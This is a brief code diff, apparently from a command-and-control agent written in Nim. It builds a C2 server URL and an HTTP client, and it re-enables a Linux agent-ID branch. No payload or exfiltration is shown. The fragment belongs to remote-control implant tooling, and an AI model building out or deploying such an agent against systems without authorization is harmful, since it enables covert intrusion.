@@ -15,8 +15,8 @@ import os
 let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
 when defined(windows):
     let user_agent=get_windows_agent_id()
-# else:
-#     let user_agent=get_linux_agent_id()
+else:
+    let user_agent=get_linux_agent_id()
 let client = newHttpClient(userAgent=user_agent)
 
 
